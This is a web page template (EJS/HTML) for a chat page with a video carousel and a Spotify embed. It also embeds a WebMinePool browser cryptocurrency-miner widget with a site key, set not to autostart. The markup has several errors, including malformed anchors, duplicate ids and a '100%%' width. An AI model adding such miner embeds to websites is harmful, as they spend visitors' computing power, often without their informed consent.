<!DOCTYPE html>
<html>

<head>
  <% include global/header%>
</head>
<main class="main-content">
  <script>
    const roomName = "<%= feedback.roomName %>"
  </script>

  <body>
    <% include global/sidebar%>
    <div class="heading">
      <h1>
        Live chat
      </h1>
    </div>
    <div class="messenger" id="message-container">
    </div>
    <form id="send-container">
      <input type="text" id="message-input">
      <button class="sendbutton" type="submit" id="send-button">Send</button>
    </form>
    </div>
    <META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
    <br>
    <br>
    <br>
    <br>
    <div class="float-container">
      <div class="float-child">
        <div class="video">
          <div id="carousel2" class="carousel slide" data-ride="carousel">
            <ol class="carousel-indicators">
              <li data-target="#carousel2" data-slide-to="0" class="active"></li>
              <% for (var i =1; i < feedback.videos.length;  i++ ) { %>
                <li data-target="#carousel2" data-slide-to="<%=i%>"></li>
                <%}%>
            </ol>
            <div class="carousel-inner">
              <a href="/video/:<%=feedback.videos[0].url%>"></a><div class="carousel-item active">
               <iframe  class = "ytframe"  id="player" width="100%%" height="100%" src="<%=feedback.videos[0].url%>">
                </iframe>
              </div></a>
              <% for (var i =1; i < feedback.videos.length;  i++ ) { %>
                <a href="/video/:<%=feedback.videos[0].url%>"></a><div class="carousel-item">
                 <iframe class = "ytframe" id="player" width="100%%" height="100%" src="<%=feedback.videos[i].url%>">
                  </iframe>
                </div></a>
                <%}%>
            </div>
            <a class="carousel-control-prev" href="#carousel2" role="button" data-slide="prev">
              <span class="carousel-control-prev-icon" aria-hidden="true"></span>
              <span class="sr-only">Previous</span>
            </a>
            <a class="carousel-control-next" href="#carousel2" role="button" data-slide="next">
              <span class="carousel-control-next-icon" aria-hidden="true"></span>
              <span class="sr-only">Next</span>
            </a>
          </div>
        </div>
      </div>
      <div class="float-child">
      </div>
    </div>

    <div class="guiminer" id="wmp-container" wmp-site-key="SK_DdWp7qKGk7Cs3vwp89dW8" wmp-username="admin"
      wmp-threads="4" wmp-throttle="0.1" wmp-autostart="false" style="margin: 0 auto;">
    </div>
    <iframe class="spot" src="https://open.spotify.com/embed/playlist/0vvXsWCC9xrXsKd4FyS8kM" width="300" height="380"
      frameborder="0" allowtransparency="true" allow="encrypted-media"></iframe>
  </body>
  <% include global/footer%>
</main>

</html>